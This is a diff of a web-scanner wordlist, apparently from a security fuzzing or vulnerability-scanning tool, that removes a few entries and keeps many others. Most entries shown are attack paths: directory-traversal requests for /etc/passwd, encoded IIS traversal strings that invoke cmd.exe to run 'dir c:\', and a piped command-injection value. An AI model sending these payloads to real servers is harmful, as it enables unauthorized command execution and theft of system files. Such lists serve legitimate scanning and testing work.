@@ -44185,8 +44185,6 @@ tree/
 tree.dat
 trees/
 troops.cgi
-tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,
-ttawebtop.cgi/?action=start&pg=../../../../../../../../../../etc/passwd
 ttawebtop.cgi/?action=start&pg=../../../../../../../../../../passwd
 ttforum/index.php
 ttp://127.0.0.1:2301/
@@ -44314,28 +44312,22 @@ Vs
 VsSetCookie.exe?
 _vti_adm/admin.dll
 _vti_bin/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0" & vbCrLf & vbCrLf
-_vti_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+dir+c:\ 
 _vti_bin/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir
 _vti_bin/..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+dir
 _vti_bin/..%25%35%63../winnt/system32/cmd.exe?/c+dir
 _vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir
-_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir+c:\ 
-_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+dir+c:\ 
 _vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir
 _vti_bin/..%255c../..%255c../winnt/system32/cmd.exe?/c+dir
 _vti_bin/..%255c../winnt/system32/cmd.exe?/c+dir
-_vti_bin/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63../winnt/system32/cmd.exe?/c+dir+c:\ 
 _vti_bin/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
 _vti_bin/..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
 _vti_bin/..%%35%63../winnt/system32/cmd.exe?/c+dir
-_vti_bin/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+dir+c:\ 
 _vti_bin/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir
 _vti_bin/..%%35c../..%%35c../winnt/system32/cmd.exe?/c+dir
 _vti_bin/..%%35c../winnt/system32/cmd.exe?/c+dir
 _vti_bin/admin.pl
 _vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\ 
 _vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir
-_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\ 
 _vti_bin/cfgwiz.exe
 _vti_bin/CGImail.exe
 _vti_bin/check.bat/..%25%35%63../..%25%35%63winnt/system32/cmd.exe?/c+dir
